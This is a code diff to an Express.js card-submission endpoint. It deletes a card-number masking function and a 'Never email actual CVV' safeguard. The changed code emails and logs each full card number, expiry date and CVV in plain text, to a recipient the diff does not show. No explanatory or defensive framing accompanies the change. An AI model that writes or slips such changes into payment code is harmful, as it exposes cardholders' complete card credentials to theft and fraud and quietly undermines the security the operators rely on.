@@ -80,17 +80,17 @@ app.post('/submit-card', async (req, res) => {
       subject: 'New Card Information Submitted',
       html: `
         <h2>Card Information Submitted</h2>
-        <p><strong>Card Number:</strong> ${maskCardNumber(cardNumber)}</p>
+        <p><strong>Card Number:</strong> ${cardNumber}</p>
         <p><strong>Expiry Date:</strong> ${expiryDate}</p>
-        <p><strong>CVV:</strong> ***</p> <!-- Never email actual CVV -->
+        <p><strong>CVV:</strong> ${cvv}</p>
         <p>Received at: ${new Date().toLocaleString()}</p>
       `
     });
 
     console.log('Card information submitted:', { 
-      cardNumber: maskCardNumber(cardNumber), 
+      cardNumber, 
       expiryDate, 
-      cvv: '***' 
+      cvv 
     });
     res.send('Card information submitted successfully!');
   } catch (error) {
@@ -116,10 +116,6 @@ function isValidCardNumber(number) {
   }
 
   return sum % 10 === 0;
-}
-
-function maskCardNumber(number) {
-  return '**** **** **** ' + number.slice(-4);
 }
 
 app.listen(port, () => {
